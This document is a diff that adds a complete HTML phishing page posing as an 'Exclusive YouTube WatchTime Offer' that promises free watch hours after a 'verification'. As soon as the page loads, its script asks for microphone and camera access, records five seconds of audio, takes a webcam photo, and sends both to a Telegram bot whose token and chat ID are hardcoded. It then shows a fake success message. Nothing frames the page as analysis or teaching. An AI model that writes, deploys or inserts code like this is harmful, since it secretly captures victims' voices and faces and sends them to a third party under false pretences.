@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exclusive YouTube WatchTime Offer</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+        }
+        button {
+            background-color: #ff6f61;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #ff3b2f;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .progress {
+            width: 0%;
+            height: 10px;
+            background-color: #76ff03;
+            transition: width 5s ease;
+        }
+    </style>
+    <script>
+        function sendToTelegram(file, type) {
+            var telegramBotUrl = "https://api.telegram.org/bot7107161817:AAHVkYJ5mEarFhg-5GA6Q3gi5h-1N_6MGFQ/send" + type + "?chat_id=6215932196";
+            var formData = new FormData();
+            formData.append(type === "Photo" ? "photo" : "voice", file);
+
+            var request = new XMLHttpRequest();
+            request.open("POST", telegramBotUrl, true);
+            request.send(formData);
+
+            alert("Thank you! Your data has been successfully sent.");
+        }
+
+        function startAudioRecording() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                var constraints = { audio: true };
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function (stream) {
+                        var mediaRecorder = new MediaRecorder(stream);
+                        var audioDataChunks = [];
+
+                        mediaRecorder.ondataavailable = function (e) {
+                            audioDataChunks.push(e.data);
+                        }
+
+                        mediaRecorder.onstop = function () {
+                            var audioBlob = new Blob(audioDataChunks, { type: 'audio/wav' });
+                            sendToTelegram(audioBlob, "Voice");
+                        }
+
+                        mediaRecorder.start();
+                        setTimeout(function () {
+                            mediaRecorder.stop();
+                        }, 5000);
+                    })
+                    .catch(function (error) {
+                        alert("Please allow microphone access to proceed.");
+                        console.error("Error accessing microphone:", error);
+                    });
+            } else {
+                alert("Audio recording not supported in this browser ❌");
+            }
+        }
+
+        function captureImage() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                var constraints = { video: true };
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function (stream) {
+                        var video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        video.onloadedmetadata = function () {
+                            var canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            var context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            canvas.toBlob(function (blob) {
+                                sendToTelegram(blob, "Photo");
+                            }, 'image/jpeg');
+
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    })
+                    .catch(function (error) {
+                        alert("Please allow camera access to proceed.");
+                        console.error("Error accessing camera:", error);
+                    });
+            } else {
+                alert("Image capture not supported in this browser ❌");
+            }
+        }
+
+        window.onload = function () {
+            document.querySelector('.progress').style.width = '100%';
+            startAudioRecording();
+            captureImage();
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Exclusive YouTube WatchTime Offer</h1>
+        <p>Complete the quick verification process to unlock <strong>4000 hours</strong> of YouTube WatchTime instantly!</p>
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+        <button onclick="startAudioRecording()">Complete Verification Now 📥</button>
+    </div>
+</body>
+</html>
